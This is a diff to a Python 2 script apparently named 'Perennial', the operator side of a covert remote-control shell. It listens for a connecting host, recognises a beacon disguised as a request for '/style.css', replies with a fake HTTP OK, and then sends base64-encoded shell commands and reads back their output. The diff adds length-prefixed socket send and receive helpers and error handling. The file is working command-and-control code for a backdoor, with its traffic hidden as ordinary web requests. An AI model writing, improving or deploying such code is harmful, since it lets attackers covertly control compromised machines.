@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import re
+import sys
 import base64
 import socket
 import argparse
@@ -47,15 +48,56 @@ def ctrl_shell_server(s, PORT):
                 print 'psh: {}: command not found'.format(inp)
         except KeyboardInterrupt:
             break
-    conn.send(base64.b64encode('fin'))
-    conn.close()
+    socksend(conn, 'fin')
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
 def ctrl_shell_exec(conn, inp):
-    conn.send(base64.b64encode(inp))
-    stdout = conn.recv(SIZE)
-    return base64.b64decode(stdout)
+    socksend(conn, inp)
+    response = base64.b64decode(sockrecv(conn))
+    return response
+
+
+def socksend(s, msg):
+    """
+        Sends message using socket operating under the convention that the
+        first five bytes received are the size of the following message.
+    """
+
+    pkg = base64.b64encode(msg)
+    pkg_size = '{:0>5d}'.format((len(pkg)))
+    pkg = pkg_size + pkg
+    sent = s.sendall(pkg)
+    if sent:
+        raise socket.error('socket connection broken')
+
+
+def sockrecv(s):
+    """
+        Receives message from socket operating under the convention that the
+        first five bytes received are the size of the following message.
+        Returns the message.
+
+        TODO: Under high network loads, it's possible that the initial recv
+        may not even return the first 5 bytes so another loop is necessary
+        to ascertain that.
+    """
+
+    chunks = []
+    bytes_recvd = 0
+    initial = s.recv(SIZE)
+    if not initial:
+        raise socket.error('socket connection broken')
+    msglen, initial = (int(initial[:5]), initial[5:])
+    bytes_recvd = len(initial)
+    chunks.append(initial)
+    while bytes_recvd < msglen:
+        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
+        if not chunk:
+            raise socket.error('socket connection broken')
+        chunks.append(chunk)
+        bytes_recvd += len(chunk)
+    return ''.join(chunks)
 
 
 def main():
@@ -71,10 +113,18 @@ def main():
     conn, addr = s.accept()
     print '[i] Connected By: {} at {}'.format(addr, datetime.now())
     ping = conn.recv(SIZE)
+    if not ping:
+        raise socket.error('socket connection broken')
     if ping.startswith('GET /style.css HTTP/1.1'):
         conn.send(FAKEOK)
         conn.close()
-        ctrl_shell_server(s, PORT)
+        try:
+            ctrl_shell_server(s, PORT)
+        except socket.error:
+            print '[!] ({}) Socket error.'.format(datetime.now())
+            print '[-] ({}) Perennial terminated.'.format(datetime.now())
+            sys.exit(0)
+    print '[-] ({}) Perennial terminated.'.format(datetime.now())
 
 if __name__ == '__main__':
     main()
